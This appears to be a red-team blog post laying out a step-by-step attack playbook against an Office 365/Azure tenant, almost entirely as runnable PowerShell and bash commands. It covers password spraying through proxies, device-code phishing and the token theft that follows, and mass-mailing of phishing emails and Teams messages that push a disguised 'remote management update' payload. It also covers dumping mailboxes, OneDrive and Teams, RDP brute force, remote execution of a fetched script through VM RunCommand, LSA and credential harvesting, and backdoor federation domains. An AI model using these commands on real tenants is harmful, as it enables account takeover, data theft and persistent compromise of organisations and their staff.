---
layout: '../../layouts/Post.astro'
title: O365 - Attack Methodology
image: '/images/hydra'
publishedAt: 2023-10-02
category: 'Cloud'
---

## Office 365 / Graph Methodology

## Phishing using AAdinternals, TokenTactics, Trevorspray/o365spray, MAAD-AF

### Clone and Install Modules
```powershell
cd O365
git clone https://github.com/rvrsh3ll/TokenTactics.git
git clone https://github.com/mgeeky/AzureRT

Install-Module Az
Install-Module AzureAd
Install-Module AADInternals
Install-Module Microsoft.Graph
```


### Import Modules - Increase Function Count to Avoid Graph Error
```powershell
$maximumfunctioncount = '32768'
Import-Module AADInternals
Import-Module .\TokenTactics\TokenTactics.psd1
Import-Module Az
Import-Module AzureAD
Import-Module Microsoft.Graph
```


```
########## PHASE I ##########################################################################################################
########## External Recon ###################################################################################################
```

### External Variables
```powershell
$tenant = "shrine.cloud"
Invoke-AADIntReconAsOutsider -Domain $tenant | Format-Table
```

### Invoke user enumeration as an outsider user or using a text file
```powershell
$user = 'adelev@shrine.cloud'
```

### Obtain list of users from OSINT on LinkedIn, dehashed, Hunter, etc
```powershell
cat emails.txt
```

### User or List of Users, checks against a quiet API endpoint
```powershell
Invoke-AADIntUserEnumerationAsOutsider -UserName $user
Get-Content .\emails.txt | Invoke-AADIntUserEnumerationAsOutsider > validemailsAAD.txt
```

### Initial Spray Against users we've validated, slow slow SLOWWWW
### Try Vs TrevorSpray, TeamFiltration
### o365 better to control speed, TrevorSpray has natural proxy support

### o365 Spray from Shrine ( need get work with fireprox )
```powershell
git clone https://github.com/0xZDH/o365spray.git
cd o365spray
pip install -r requirements.txt
sudo chmod +x o365spray.py
```


### Check if O365
```powershell
o365spray.py --validate --domain $tenant
```

### Perform username enumeration against a given domain:
```powershell
o365spray.py --enum -U emails.txt --domain $tenant
```

### Perform password spraying against a given domain:
```powershell
o365spray --spray -U emails.txt -P $passwords --count 2 --lockout 5 --domain $tenant
```


### Slower, sleepier, jittery spray
```powershell
./o365spray.py --spray -U emails.txt -P knownpasswords.txt --count 1 --lockout 5 --domain $tenant --rate 1 --sleep -1 --jitter 20 

../o365spray/o365spray.py --spray -U emails.txt -P knownpasswords.txt --count 3 --lockout 5 --domain $tenant --rate 1 --sleep -1 --jitter 20
```


## Initial Phish

### Generate a device code
```powershell
Get-AzureToken -Client Graph
```

### show tokens
```powershell
Write-Output "Access token:"
$response.access_token

Write-Output "Refresh token:"
$response.refresh_token
```

## 1st Cred - AzureAD Recon

### Connect to AzureAd and dump users/groups
```powershell
cd loot
$target = 'adelev@shrine.cloud'
Connect-AzureAD -AadAccessToken $response.access_token -AccountId $target
```


### Get all users and export to CSV
```powershell
$users = Get-AzureADUser -All $true
$users | Export-Csv -Path "users.csv" -NoTypeInformation
```

### Get all groups and export to CSV
```powershell
$groups = Get-AzureADGroup -All $true | Export-Csv -Path "groups.csv" -NoTypeInformation
```


# Extract the email addresses of the users
```powershell
$emailAddresses = $users | Select-Object -ExpandProperty UserPrincipalName
```


# Output the email addresses to a text file
```powershell
$emailAddresses | Out-File -FilePath 'emails.txt'
```


### Start 2nd Spray with emails gathered
## Alternate Spray with TrevorSpray Proxied through EC2
```powershell 
pip install git+https://github.com/blacklanternsecurity/trevorproxy
pip install git+https://github.com/blacklanternsecurity/trevorspray
```


### Spray Token Endpoint
```bash
tenant="shrine.cloud"
password="Password123!"
proxy1="proxywars.eastus.cloudapps.azure.com"
Proxy2="sorrowset-ec2.straightchillin.com"
trevorspray -u emails.txt -p $password  --url $url --delay 60 --lockout-delay 60 --jitter 30 --ssh ansible@$proxy1
```


### Default Endpoint Spray Slow over Proxy
```bash
trevorspray -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30 --ssh user@$proxy1
```

## Tenant Recon

## Azure Hound

### Refresh Token
```powershell 
$tok = $response.refresh_token
```


### Azurehound from Linux
```powershell 
iwr https://github.com/BloodHoundAD/AzureHound/releases/download/rolling/azurehound-linux-amd64.zip -o .\azurehound.zip
expand-archive ./azurehound.zip
./azurehound/azurehound -r $tok list --tenant $tenant-o ./azurehound.json 
```


### Azurehound from Windows
```powershell 
  iwr https://github.com/BloodHoundAD/AzureHound/releases/download/v1.2.4/azurehound-windows-amd64.zip -o azurehound.zip
  expand-archive ./azurehound.zip
  .\azurehound.exe -r $tok list --tenant $tenant-o azurehound.json
```
 


## Email Recon

### Browse inbox folders

### Refresh to Graph as iPhone/Safari 
```powershell 
RefreshTo-MSGraphToken -refreshToken $response.refresh_token -domain $tenant -Device iPhone -Browser Safari
```


### take first X emails from user inbox
```powershell 
$folder = 'inbox'
$X = "20"
Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder $folder -top $X -Device iPhone -Browser Safari 
```

### Open inbox in browser
### RefreshTo-SubstrateToken -refreshToken 
```powershell 
$response.refresh_token -domain $tenant -Device AndroidMobile -Browser Android
```

### Open-OWAMailboxInBrowser -AccessToken 
```powershell 
$SubstrateToken.access_token -Device Mac -Browser Chrome
```

### Open a new BurpSuite Repeater tab & set the Target to ‘https://Substrate.office.com’
### Paste the below request into Repeater & Send
### Right click the response > ‘Show response in browser’, then open the response in Burp’s embedded browser
### Refresh the page to access the mailbox

### Get all VMs and PublicIps in the subscription
```powershell 
$vms = Get-AzVM

# Loop through each VM and get its public IP address (if it has one)
$publicIps = foreach ($vm in $vms) {
    if ($vm.PublicIpAddress -ne $null) {
        [PSCustomObject]@{
            ResourceGroupName = $vm.ResourceGroupName
            Name = $vm.Name
            PublicIpAddress = $vm.PublicIpAddress
        }
    }
}

## Export the results to a CSV file
$publicIps | Export-Csv -Path "VmIPs.csv" -NoTypeInformation
```



# Brute Force VMs with Public IPs

# crackmapexec
```powershell 
./cme rdp $VMIP -u $user -P $wordlist 
```

# CrowBar
```bash
sudo apt install -y nmap openvpn freerdp2-x11 tigervnc-viewer   python3 python3-pip
git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt

# First VM, trying admin account, Single IP, User, Passwordlist
VMIP=""
cidr=""
user="adelev"
wordlist="shortpass.txt"
wordlist2=".\O365\loot\shortpass.txt"
./crowbar.py -b rdp -s $VMIP -u $user -C $wordlist shortpass.txt
# Hydra
hydra -t 1 -V -f -l $user -P $wordlist rdp://$VMIP
```

######################################### PHASE II ###########################################################################
## Password Spraying
## Can run from TrustedIP space here to avoid MFA / Simulate Trusted Network
## Can run from an AzureIP / Cloud Shell for trusted-ish external IP

## TrevorSpray from TrustedIP/Shell/AzNix (try proxy through cloud shell)
```bash
pip install git+https://github.com/blacklanternsecurity/trevorproxy
pip install git+https://github.com/blacklanternsecurity/trevorspray
### Variables
tenant="shrine.cloud"
password="Password123!"
```

# Recon
```bash
trevorspray --recon $tenant
```


### Enumerate users via OneDrive (no failed logins) or Seamless_sso
```bash
trevorspray --recon $tenant -u emails.txt --threads 10

# --delay         Sleep for this many seconds between requests
# --lockout-delay Sleep for this many additional seconds when a lockout is encountered
# --jitter        Add a random delay of up to this many seconds between requests

trevorspray -u emails.txt -p $password --ssh root@1.2.3.4 root@4.3.2.1 --delay 30 --lockout-delay 30 --jitter 10
```


### Workflow - Spray Token Endpoint Slow
## Recon for URL
```bash
trevorspray --recon $tenant
url=""
trevorspray -u emails.txt -p $password --url $url --delay 60 --lockout-delay 60 --jitter 30
```

### Workflow - Default Endpoint Spray Slow
```bash
trevorspray -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30
```

### Spray Modules
```bash
trevorspray owa -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30
trevorspray adfs -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30
trevorspray okta -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30
trevorspray msol -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30
trevorspray anyconnect -u emails.txt -p $password --delay 60 --lockout-delay 60 --jitter 30
```

### Spray Across Proxies
```bash
proxy1=""
proxy2=""
trevorspray -u emails.txt -p $password --ssh mellonaut@$proxy2 ansible@$proxy1
```

## Trevor Spray Extract LZX files looted from MFA bypass
### get libmspack (for extracting LZX file)
```bash
git clone https://github.com/kyz/libmspack
cd libmspack/libmspack/
./rebuild.sh
./configure
make
```

# extract LZX file
```bash
./examples/.libs/oabextract ~/.trevorspray/loot/deadbeef-ce01-4ec9-9d08-1050bdc41131-data-1.lzx oab.bin

# extract all strings
strings oab.bin
# extract and dedupe emails
egrep -oa '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' oab.bin | tr '[:upper:]' '[:lower:]' | sort -u
```

## TrevorSpray Find ValidUsernames without OSINT
### clone wordsmith dataset
```bash
tenant="shrine.cloud"
wget https://github.com/skahwah/wordsmith/releases/download/v2.1.1/data.tar.xz && tar -xvf data.tar.xz && cd data
### order first initial by occurrence
ordered_letters=asjmkdtclrebnghzpyivfowqux
### loop through first initials
echo -n $ordered_letters | while read -n1 f; do
  # loop through top 2000 USA last names
  head -n 2000 'usa/lnames.txt' | while read last; do
    # generate emails in f.last format
    echo "${f}.${last}@$tenant"
  done
done | tee f.last.txt
trevorspray -u f.last.txt -p 'Welcome123'
```

## TeamFiltration Linux
```powershell
iwr https://github.com/Flangvik/TeamFiltration/releases/download/v3.5.0/TeamFiltration-Linux-v3.5.0.zip -o teamfiltration.zip
unzip ./teamfiltration.zip
./teamfiltration
```

# TeamFiltration Windows
```powershell
iwr https://github.com/Flangvik/TeamFiltration/releases/download/v3.5.0/TeamFiltration-Win-v3.5.0.zip -o teamfiltration.zip

Expand-Archive teamfiltration.zip
.\teamfiltration.exe

# Create Config
{
    "pushoverAppKey": "",
    "pushoverUserKey": "",
    "dehashedEmail" : "",
    "dehashedApiKey": "", 
    "sacrificialO365Username": "adelev@shrine.cloud", 
    "sacrificialO365Passwords": "",  
    "proxyEndpoint": "http://127.0.0.1:8080",
    "AWSAccessKey": "",
    "AWSSecretKey": "",
    "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36"
}
```

## TeamFiltration
### Requires a NON MFA sacraificl O365 account with business basic license
### Enumeration with statisitcally generated usernames 
```powershell
.\TeamFiltration.exe --outpath adele --config sc200.json --enum --validate-teams --domain $tenant
```

### Enumeration w/ custom list
```powershell
.\TeamFiltration.exe --outpath adele --config sc200.json --usernames emails.txt --enum --validate-teams --domain $tenant
```

### Spray with generated list of months and seasons
```powershell
.\TeamFiltration.exe --outpath adele --config sc200.json --spray --sleep-min 120 --sleep-max 200
```

### Spray with custom list
```powershell
.\TeamFiltration.exe --outpath adele --config sc200.json --spray --passwords $passwords --sleep-min 120 --sleep-max 200
```

### Exfil AAD, all=graph,owa,sharepoint,onedrive,teams
```powershell
.\TeamFiltration.exe --outpath adele --config sc200.json --exfil --aad
.\TeamFiltration.exe --outpath adele --config sc200.json --exfil --all 
```

### Exfil auth tokens
```powershell
.\TeamFiltration.exe --outpath adele --config sc200.json --exfil --tokens 
```

### Override creds to exfil
```powershell
.\teamfiltration.exe --outpath \adele --exfil --all --username $user --password $password
```

### backdoor
```powershell
.\teamfiltration.exe --outpath adele --config sc200.json --backdoor
```

### Access Database
```powershell
.\teamfiltration.exe --outpath adele --config sc200.json --database
```

### Examples
```powershell
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --spray --passwords Passwords.txt --time-window 13:00-22:00
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --all
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --aad
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames emails.txt
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --backdoor
--outpath C:\Clients\2023\FooBar\TFOutput --config myCustomConfig.json --database
```

## Internal Phishing

### Phish an IT Admin for PrivEsc
### Device Code Email w/ Teams Message to Back it 
### Customize the message
```powershell
Clear-Token
RefreshTo-SubstrateToken
Get-AADIntAccessTokenFor Graph -SaveToCache
$tenant = "shrine.cloud"
$code = ""
$op = "Sharproot Electrical"
$target = 'derf@shrine.cloud'

$msg = "<div>Hi!<br/>This is a message sent to you by <a href='https://microsoft.com/devicelogin'>$op</a>. <br/><br/>Here is  <a href='{1}'>your doument</a> you <b></b>.<br/><br/> Provide the following code when requested: <b>$code</b>.</div>"
$subject = "$op has shared a document with you"
```

### Send the Phishing Email
```powershell
Send-AADIntOutlookMessage -AccessToken $OutlookToken.access_token -Recipient $target -Subject $subject -Message $msg
```

### Send Teams message support your email
```powershell
RefreshTo-MSTeamsToken -domain $tenant -refreshToken $response.refresh_token
$MSTeamsToken.access_Token

Send-AADIntTeamsMessage -AccessToken $MSTeamsToken.access_Token -Recipients $target -Message "Just sent you an email, look what $op offered!!"
```


## Payload to Intune Admin

### Setup First Payload Delivery
### from Teamfiltration, loot, up to O365
```powershell
cd ../../
pwd
$app = "OneDriveBusinessSSO"
$rg = "Phishing"
$path = ".\Payloads\Packages\dropd-shrine48-img\phishing"
cd $path
az webapp up -g $rg -n $app --sku free --html

# or Serve w/ custom NSG rules
# .\Payloads\Packages\dropd-shrine48-img\serve.ps1 -deploy
cd ..\..\..\..\

# az webapp delete -g $rg -n $app
```

### If you need a new token
```powershell
Clear-Token
Get-AzureToken -Client Graph
```

### Email and Teams the Payload Link
### Will link to html smuggled payload
```powershell
$tenant = "shrine.cloud"
$url = "http://$app.azurewebsites.net"
$target = 'targettim@shrine.cloud'

$msg = "<div>Hi!<br/>This is a message sent to you by <a href='https://Sharprootelectricalservices.com'>Sharproot Electrical</a>. <br/><br/>Your document is  <a href='{1}'>ready</a> <b></b>.<br/><br/> Click here to view: <b>$url</b>.</div>"
# try this msg2 as well

$msg2 = "<div>Hi!<br/>This is a message sent to you by <a href=$url>Sharproot Electrical</a>. <br/><br/>Your document is  <a href='{1}'>ready</a> <b></b>.<br/><br/> Click here to view: <b>$url</b>.</div>"

$subject = 'Contract Proposal'

### Send the Phish w/ Function
Send-AADIntOutlookMessage -AccessToken $OutlookToken.access_token -Recipient $target -Subject $subject -Message $msg

### Send the link with Teams
RefreshTo-MSTeamsToken -domain $tenant -refreshToken $response.refresh_token
$MSTeamsToken.access_Token

Send-AADIntTeamsMessage -AccessToken $MSTeamsToken.access_Token -Recipients $target -Message "Just sent you an email, look what they just offered: $url"
```


## Automate Internal 
### ForEach in users, wait %random in 3 minutes, send one
### Clear Tokens if needed
```powershell
Clear-Token -Token All
```

### Get Device COde to Phish IT Admin
```powershell
Get-AzureToken -Client Graph
```

### Set Variables
```powershell
$app = "OneDriveBusinessSSO"
$targetList = Get-Content .\users.txt
$subject = 'New Device Policy'
$msg = "<div>Hi!<br/> We have updated our device usage and privacy policy. Please sign new contract agreement for your device to continue accessing company resources.  <a href='https://office.com'></a>. <br/><br/>Your document is  <a href='{1}'>ready</a> <b></b>.<br/><br/> Click here to view: <b>{0}</b>.</div>"

# Loop through the target list
foreach ($target in $targetList) {
  # Set a random sleep duration between 2.5 and 7.5 minutes
  $sleepSeconds = Get-Random -Minimum 150 -Maximum 451

  # Set up the email message with the payload link
  $url = "http://$app.azurewebsites.net"
  $message = $msg
  # Send the email
  Send-AADIntOutlookMessage -AccessToken $OutlookToken.access_token -Recipient $target -Subject $subject -Message $message

  # Wait for the random sleep duration
  Start-Sleep -Seconds $sleepSeconds
}
```

 
## Teams Payload From Intune Admin to IT / HVT
### $tenant = "shrine.cloud"
```powershell
$app2 = "TeamViewerSSO"
$url = "http://$app2.azurewebsites.net"
$rg = "Phishing"
$payload = $path
cd $payload
az webapp up -g $rg -n $app2
$target = 'intuneadmin@shrine.cloud'
$target2 = 'it@shrine.cloud'
$target3 = 'cloudadmin@shrine.cloud'

# Send a TeamViewer Update to user
RefreshTo-MSTeamsToken -domain $tenant -refreshToken $response.refresh_token
$MSTeamsToken.access_Token

Send-AADIntTeamsMessage -AccessToken $MSTeamsToken.access_Token -Recipients $target -Message "Hey, sorry to bother, we're having everyone update the remote management software on their workstation. Please run this when you get a chance shouldn't take long: $url"

Start-Sleep -Seconds 180

Send-AADIntTeamsMessage -AccessToken $MSTeamsToken.access_Token -Recipients $target3 -Message "Sorry to bother you sir, IT needs you to update our management software for youre device to remain compliant. You might lose access to your email/teams until you do. Please run this when you get a chance shouldn't take long: $url. Thank you!"
Start-Sleep -Seconds 160

# Send to the IT Team Channel
Send-AADIntTeamsMessage -AccessToken $MSTeamsToken.access_Token -Recipients $target2 -Message "Team, sorry to bother you, we're having everyone update the remote management software on their workstation. Just run this when you get a chance shouldn't take long: $url"
```

## Automated Teams Payload Phishing

```powershell
$app2 = "TeamViewerSSO"
$url = "http://$app2.azurewebsites.net"
$targetList = Get-Content .\users.txt
# Loop through the target list
foreach ($target in $targetList) {
    # Set a random sleep duration between 2.5 and 7.5 minutes
    $sleepSeconds = Get-Random -Minimum 150 -Maximum 451
  
    # Send the Teams message
    RefreshTo-MSTeamsToken -domain $tenant -refreshToken $response.refresh_token
    $MSTeamsToken.access_Token
    
    $message = "Hey, sorry to bother, we're having everyone update the remote management software on their workstation. Please run this when you get a chance shouldn't take long: $url"
    
    Send-AADIntTeamsMessage -AccessToken $MSTeamsToken.access_Token -Recipients $target -Message $message
  
    # Wait for the random sleep duration
    Start-Sleep -Seconds $sleepSeconds
 	}
```

### Token Tactics Help
```powershell
Clear-Token -Token All

Connect-AzureAD -AadAccessToken $response.access_token -AccountId "targettim@shrine.cloud"



# Get-Command -Module TokenTactics
# CommandType Name Version Source
# ———– —- ——- ——
# Function Clear-Token 0.0.1 TokenTactics
# Function Dump-OWAMailboxViaMSGraphApi 0.0.1 TokenTactics
# Function Forge-UserAgent 0.0.1 TokenTactics
# Function Get-AzureToken 0.0.1 TokenTactics
# Function Get-TenantID 0.0.1 TokenTactics
# Function Open-OWAMailboxInBrowser 0.0.1 TokenTactics
# Function Parse-JWTtoken 0.0.1 TokenTactics
# Function RefreshTo-AzureCoreManagementToken 0.0.1 TokenTactics
# Function RefreshTo-AzureManagementToken 0.0.1 TokenTactics
# Function RefreshTo-DODMSGraphToken 0.0.1 TokenTactics
# Function RefreshTo-GraphToken 0.0.1 TokenTactics
# Function RefreshTo-MAMToken 0.0.1 TokenTactics
# Function RefreshTo-MSGraphToken 0.0.1 TokenTactics
# Function RefreshTo-MSManageToken 0.0.1 TokenTactics
# Function RefreshTo-MSTeamsToken 0.0.1 TokenTactics
# Function RefreshTo-O365SuiteUXToken 0.0.1 TokenTactics
# Function RefreshTo-OfficeAppsToken 0.0.1 TokenTactics
# Function RefreshTo-OfficeManagementToken 0.0.1 TokenTactics
# Function RefreshTo-OutlookToken 0.0.1 TokenTactics
# Function RefreshTo-SubstrateToken 0.0.1 TokenTactics
```


## Dump Emails by Folder
### Refresh to Graph as iPhone/Safari 
```powershell
RefreshTo-MSGraphToken -refreshToken $response.refresh_token -domain $tenant -Device iPhone -Browser Safari

RefreshTo-MSGraphToken -refreshToken $tok -domain $tenant -Device iPhone -Browser Safari

### take all emails from user folder, add -top X to limit dumpo to csv
$folder = 'inbox'
Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder $folder -Device iPhone -Browser Safari > emails.csv


### Download the contents of the OneDrive to the current folder in a csv
$os = New-AADIntOneDriveSettings    

Get-AADIntOneDriveFiles -OneDriveSettings $os | Format-Table > onedrive.csv

## Dump Teams to current folder in a csv
RefreshTo-MSTeamsToken -domain $tenant -refreshToken $response.refresh_token -SaveToCache
RefreshTo-MSTeamsToken -domain $tenant -refreshToken $tok -SaveToCache
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName > teams.csv
```


## VM RunCommand / ARC / Intune Admin Abuse

### VM RunCommand - Single command
```powershell
$vmName = "Vm1"
$rg = "Devices"
$location = "eastus"
$command = ". { iwr -useb https://boxstarter.org/bootstrapper.ps1 } | iex; get-boxstarter -Force"
$scriptName = "boxstarter"
$user = "planethacker"

az vm run-command create --resource-group $rg --location $location --async-execution false --run-as-password $password --run-as-user $user --script $command --timeout-in-seconds 3600 --run-command-name $scriptName --vm-name $vmName
```

### VM RunCommand - Script
```powershell
$script = Get-Content .\tester.ps1
$script = "tester.ps1"
$command = $script
az vm run-command create --resource-group $rg --location $location --async-execution false --run-as-password $password --run-as-user $user --script $command --timeout-in-seconds 3600 --run-command-name $scriptName --vm-name $vmName
```

## ARC - Invoke Command on Arc Enabled Machines
```powershell
Install-Module -Name Az.ConnectedMachine -AllowPrerelease
import-module -Name Az.ConnectedMachine

    # Script to Create and Set Extension to run command
    $rg = "TierZero"
    $boxy = "boxybrown"
    $domain = "domain" 
    $scriptName =  "DirLister"
    $location = "eastus"
    $command = "powershell.exe -c Get-Process" 
    Get-AzConnectedMachine -ResourceGroupName $rg
    $machineName = $domain
    
 
    Get-AzConnectedMachineExtension -ResourceGroupName $rg -MachineName $machineName
    $Settings = @{ "commandToExecute" = $command }
   
    # Create New Extension to Run Command with Settings
    New-AzConnectedMachineExtension -Name $scriptName -ResourceGroupName $rg -MachineName $machineName -Location $location -Publisher "Microsoft.Compute" -TypeHandlerVersion 1.10 -Settings $Settings -ExtensionType CustomScriptExtension
    
    # Set the Extension on the VM
    Set-AzConnectedMachineExtension -Name $scriptName -ResourceGroupName $rg -MachineName $machineName -Location $location -Publisher "Microsoft.Compute" -TypeHandlerVersion 1.10 -Settings $Settings -ExtensionType CustomScriptExtension

    # Open Session on machine
    $session = Connect-PSSession -ComputerName $machineName 
```

### ARC = Onboard Local or Remote Machines to ARC
```powershell
    # Onboard current machine to arc
    Connect-AzConnectedMachine -ResourceGroupName$rg -Name $machineName -Location $location
    
    # Onboard remote machine over pssession
    $session = Connect-PSSession -ComputerName $machineName
    Connect-AzConnectedMachine -ResourceGroupName$rg -Name $machineName -Location $location -PSSession $session
```


### Automated Attack Framework - MAADAF
```powershell
git clone https://github.com/vectra-ai-research/MAAD-AF.git
cd MAAD-AF
./MAAD_Attack.ps1
```

## Harvesting Credentials 


### Hybrid Machine LSA Dump with AADInternals
```powershell
Get-AADIntLSASecrets
```

### AADInternals - Get LSA backup keys
```powershell
$backup = Get-AADIntLSABackupKeys
$rsa = $backup[0]
$legacy = $backup[1]
$user = 'targettim@shrine.cloud'
```

### AADInternals - Get System Master Keys using LSA Backup
```powershell
# Get the LSA backup keys
$backup = Get-AADIntLSABackupKeys
```

### AADInternals - Save the private key to a variable
```powershell
$backup | where name -eq RSA
```

### AADInternals - Get system master keys (not quite working, key is null)
```powershell
Get-AADIntSystemMasterkeys -SystemKey $rsa.key
```

### AADInternals - Get User Master Keys using LSA Backup
 ```powershell
 # Get the LSA backup keys
 $lsabk_keys=Get-AADIntLSABackupKeys
 # Save the private key to a variable
 $rsa_key=$lsabk_keys | where name -eq RSA
 # Get user's master keys
 Get-AADIntUserMasterkeys -UserName $user -SID $SID -SystemKey $rsa_key.key
```


### AADInternals - Get user's master keys with username and password
```powershell
Get-AADIntUserMasterkeys -UserName $user -SID $SID -Password "password"
```


### AADInternals - Get Local Creds, may fail as normnal user
```powershell
# Get the LSA backup keys
$lsabk_keys=Get-AADIntLSABackupKeys
# Save the private key to a variable
$rsa_key=$lsabk_keys | where name -eq RSA
# Get user's master keys
$user_masterkeys=Get-AADIntUserMasterkeys -UserName $user -SID $SID -SystemKey $rsa_key.key
# List user's credentials
Get-AADIntLocalUserCredentials -UserName $user -MasterKeys $user_masterkeys
```


### AADInternals - Get the PRToken from current device
 ```powershell
 $prtToken = Get-AADIntUserPRTToken
```

### AADInternals - Get an access token for AAD Graph API and save to cache
```powershell
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```


### Fast Cred Harvest Script 
```powershell
# Create an empty hashtable to store output
$user = 'targettimf@shrine.cloud'
 $SID = 'S-1-5-xxxx'
 $output = @{}
# # Hybrid Machine LSA Dump with AADInternals
# $output.LSASecrets = Get-AADIntLSASecrets
# # Get LSA backup keys
  $output.LSABackupKeys = Get-AADIntLSABackupKeys
# Get System Master Keys using LSA Backup
# Get the LSA backup keys
# $lsabk_keys = Get-AADIntLSABackupKeys
# # Save the private key to a variable
 $rsa_key = $lsabk_keys | where name -eq RSA
 # # Get system master keys
 $output.SystemMasterkeys = Get-AADIntSystemMasterkeys -SystemKey $rsa_key.key
 # # Get User Master Keys using LSA Backup
 # # Get the LSA backup keys
 $lsabk_keys = Get-AADIntLSABackupKeys
 # # Save the private key to a variable
 $rsa_key = $lsabk_keys | where name -eq RSA
 # # Get user's master keys
 $output.UserMasterkeys = Get-AADIntUserMasterkeys -UserName $user -SID $SID -SystemKey        $rsa_key.key
 # Get the PRToken from current device
 $prtToken = Get-AADIntUserPRTToken
 # Get an access token for AAD Graph API and save to cache
 $output.AccessTokenForAADGraph = Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
 # Get Local Creds, may fail as normal user
 # Get the LSA backup keys
 $lsabk_keys = Get-AADIntLSABackupKeys
 # Save the private key to a variable
 $rsa_key = $lsabk_keys | where name -eq RSA
 # Get user's master keys
 $user_masterkeys = Get-AADIntUserMasterkeys -UserName $user -SID $SID -SystemKey $rsa_key.key
 # List user's credentials
 $output.LocalUserCredentials = Get-AADIntLocalUserCredentials -UserName $user -MasterKeys $user_masterkeys
 # Save output to file
 $output | ConvertTo-Json | Out-File -Encoding utf8 -FilePath "./CredHarvest.json"
```


## Domain Escalation into Azure from AD Admin

### AADINternals-Get Sync Creds
```powershell
Get-AADIntSyncCredentials
Get-AADIntSyncCredentials > ADSyncCreds.json
```

### AADINternals - Modifying Users
#### Save the credentials to a variable
```powershell
$creds=Get-Credential 
#### Get an access token and save to cache
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
#### List the sync objects w/ OnPrem Values
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
#### List the Azure AD users
Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName
```


## Persistence

### https://aadinternals.com/aadinternals/#hack-functions-active-directory

### AADInternals - Join w/ New PRT Token using current session info
```powershell
# Get user's credentials
$creds = Get-Credential
# Get new PRT and key
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -Credentials $cred
$prtKeys > PrtKeys.json
```

### New MDM keys / cert with PRT
```powershell
# Get an access token for MDM and save to cache
Get-AADIntAccessTokenForIntuneMDM -SaveToCache
# Get new PRT and key
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -UseRefreshToken
```

### Join On Prem Device to Hybrid AzureAD
```powershell
#### Get an access token and save to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache
#### Join the device to Azure AD
Join-AADIntOnPremDeviceToAzureAD -DeviceName "workstation-432"

### Join as AzureAd Device 
#### Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
#### Register the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My first computer" -DeviceType "Commodore" -OSVersion "Vic20" -JoinType Register
```

### Guest User (doesnt accept PUT requests error)
```powershell
#### Get the auth token. Supports also external users (outlook.com, etc.)
$zt=Get-AADIntAccessTokenForAADIAMAPI -Credentials (Get-Credential)
#### Get login information for a domain
$user1 = "mellosec@outlook.com"
$email= $user1
New-AADIntGuestInvitation -AcessToken $zt -EmailAddress $email -Message "Welcome to our tenant!"
```

### Backdoors
```powershell
#### Set authentication method to managed
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntDomainAuthentication -DomainName $tenant -Authentication Managed
New-AADIntBackdoor -DomainName Sharprootelectricalservices.com

# Authentication     : Managed
# Capabilities       : None
# IsDefault          : false
# IsInitial          : false
# Name               : Sharprootelectricalservices.com
# RootDomain         :
# Status             : Unverified
# VerificationMethod :


# IssuerUri : http://any.sts/3E30209
# Domain    : Sharprootelectricalservices.com
```

